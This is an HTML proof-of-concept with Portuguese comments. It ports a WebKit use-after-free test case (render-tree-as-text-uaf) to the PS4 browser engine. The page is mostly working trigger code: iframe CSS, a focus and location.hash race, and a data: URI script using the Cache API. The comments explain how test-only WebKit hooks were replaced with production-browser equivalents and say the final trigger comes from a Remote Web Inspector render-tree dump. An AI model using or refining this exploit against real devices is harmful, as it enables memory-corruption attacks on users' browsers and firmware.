<!DOCTYPE html>
<!--
  Adaptação de render-tree-as-text-uaf.html (commit 3f3fec2)
  para execução no PS4 browser (libSceNKWebKit / AppleWebKit 605.1.15 / Orbis OS)
  sem dependências de internals ou testRunner.
-->
<style>
  iframe {
    content: url();      /* cria RenderWidget com CSS generated content — manter */
    zoom: 0.01;          /* força layout path específico no RenderWidget — manter */

    /*
     * Proxy para setAsyncFrameScrollingEnabled(true):
     * overflow: scroll promove o iframe a um composited scroll layer,
     * replicando parcialmente o efeito de async frame scrolling.
     * Não é equivalente exato — setAsyncFrameScrollingEnabled atua
     * direto no FrameView compositor; isto apenas força promoção de layer.
     */
    overflow: scroll;
  }
</style>
<script>
  /*
   * setCaretBrowsingEnabled(true): sem API JS equivalente em produção.
   * O caret browsing muda o comportamento de foco em frames; sem ele,
   * a sequência de onfocus ? location.hash pode ter timing diferente.
   * Compensamos garantindo que o iframe seja focável via tabindex="0".
   *
   * setAsyncFrameScrollingEnabled(true): veja CSS acima.
   *
   * testRunner.dumpAsText(): removido — só existe no WebKitTestRunner.
   * ATENÇÃO: sem ele, write() em RenderTreeAsText.cpp não é acionado
   * por este HTML. O trigger para o UAF precisa ser externo (Remote
   * Web Inspector do PS4 disparando a dump da render tree).
   */

  onload = () => {
    document.documentElement.append(document.createElement('frameset'));

    i0.onfocus = () => {
      location.hash = 'y';
    };

    location.hash = 'x';

    /*
     * Original (sintaxe inválida fora do WebKit REPL interno):
     *   s0.src = data:text/javascript,caches.has('a').then(() => i0.focus());;
     *
     * Dois problemas:
     *   1. Sem aspas ao redor do data: URI ? SyntaxError/ReferenceError
     *   2. Cache API pode não estar disponível no firmware PS4 alvo
     *
     * Solução: verificação de disponibilidade + fallback em Promise microtask
     * (timing assíncrono equivalente ao then() da Cache API).
     */
    if (typeof caches !== 'undefined') {
      const s0 = document.createElement('script');
      s0.src = 'data:text/javascript,caches.has("a").then(()=>document.getElementById("i0").focus())';
      document.head.append(s0);
    } else {
      // Fallback: microtask com timing similar ao IDBRequest / CacheStorage
      Promise.resolve().then(() => i0.focus());
    }
  };
</script>

<iframe id="i0" tabindex="0"></iframe>
